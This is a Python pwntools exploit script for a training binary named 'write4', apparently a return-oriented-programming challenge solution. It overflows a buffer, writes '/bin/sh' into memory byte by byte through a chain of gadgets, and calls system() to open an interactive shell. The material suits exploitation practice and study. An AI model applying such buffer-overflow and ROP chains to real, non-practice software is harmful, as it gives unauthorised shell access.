#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write4')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = b"A" * 40

string = "/bin/sh"
mem = 0x601050

for i in range(0, len(string)):
    payload += (
        p64(0x400891) + # : pop rsi ; pop r15 ; ret
        p64(mem + i) +
        b"J" * 8 +
        p64(0x400893) + # : pop rdi ; ret 
        p64(ord(string[i])) +
        p64(0x400821) # : mov dword ptr [rsi], edi ; ret
    )

payload += (
    p64(0x400894) + # : ret
    p64(0x400893) + # : pop rdi ; ret
    p64(mem) +
    p64(exe.plt["system"])
)

io.sendline(payload)

io.interactive()

